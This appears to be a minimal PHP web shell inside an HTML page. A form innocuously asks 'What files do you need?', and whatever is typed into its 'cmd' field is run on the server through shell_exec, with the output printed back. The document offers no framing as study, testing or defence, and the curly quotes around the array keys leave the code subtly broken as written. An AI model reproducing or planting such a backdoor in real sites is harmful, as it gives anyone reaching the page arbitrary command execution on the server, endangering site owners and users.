<html>
<head><title></title></head>
<body>



    <form action ="" method="get">
      <p>What files do you need?</p>
      <input type="text" name="cmd" id="cmd" />
      <label>
      <input type="submit" name="submit" id="submit" value="Submit" />
      </label>
    </form>

    <?php
    if(isset($_REQUEST[‘submit’])){
    $c = $_REQUEST[‘cmd’];
    $output = shell_exec("$c");
    echo "<pre>$output</pre>\n";
    }
     ?>
</body>
</html>
